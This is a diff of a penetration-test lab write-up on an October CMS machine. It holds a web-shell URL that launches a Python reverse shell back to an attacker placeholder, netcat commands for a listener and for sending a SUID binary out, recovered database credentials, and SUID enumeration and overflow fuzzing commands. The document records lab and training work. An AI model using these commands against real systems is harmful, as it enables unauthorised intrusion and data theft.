@@ -101,16 +101,78 @@ http://10.129.96.113/storage/app/media/sh.php5?x=system&c=pwd
 A Python reverse shell was triggered through the payload:
 
 ```
-http://10.129.96.113/storage/app/media/sh.php5?x=system&c=export RHOST="<attacker-ip>";export RPORT=<listener-port>;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+http://10.129.96.113/storage/app/media/sh.php5?x=system&c=export RHOST="<attacker-ip>";export RPORT=443;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
 ```
 
 And received with the listener:
 
 ```
-nc -lnvp <listener-port>
+nc -lnvp 443
 ```
 
 Resulting in an interactive shell as `www-data`.
 
 ---
 
+## 7. Post-Exploitation
+
+Automated enumeration was performed with linPEAS and found:
+
+- Kernel version: Linux 4.4.0
+- MySQL service listening on localhost
+- Database credentials stored in configuration files
+
+Credential discovery at `/var/www/html/cms/config/database.php` recovered the credentials:
+
+```
+october : OctoberCMSPassword!!
+```
+
+---
+
+## 8. Privilege Escalation
+
+SUID binaries were enumerated to identify potential escalation paths:
+
+```
+find / -perm -4000 -ls 2>/dev/null
+```
+
+A custom SUID binary was identified:
+
+```
+/usr/local/bin/ovrflw
+```
+
+The binary was transfered to the attacker machine for analysis:
+
+```
+nc -w <attacker-ip> 999 < /usr/local/bin/ovrflw
+```
+
+And the binary was received on the attacker machine:
+
+```
+nc -l -p 999 > overflw
+```
+
+The checksum confirmed full file transfer:
+
+```
+md5sum ovrflw
+```
+
+Initial fuzzing revealed a segmentation fault:
+
+```
+./ovrflw $(python -c 'print"A"*200')
+```
+
+The vulnerability was confirmed as a stack-based buffer overflow requiring manual exploit development. Due to limited exam relevance and time constraints, further exploitation was deferred in favor of prioritizing Active Directory attack chains.
+
+---
+
+## 9. Appendix
+
+October CMS - PHP Upload Protection Bypass -
+[https://www.exploit-db.com/exploits/41936](https://www.exploit-db.com/exploits/41936)
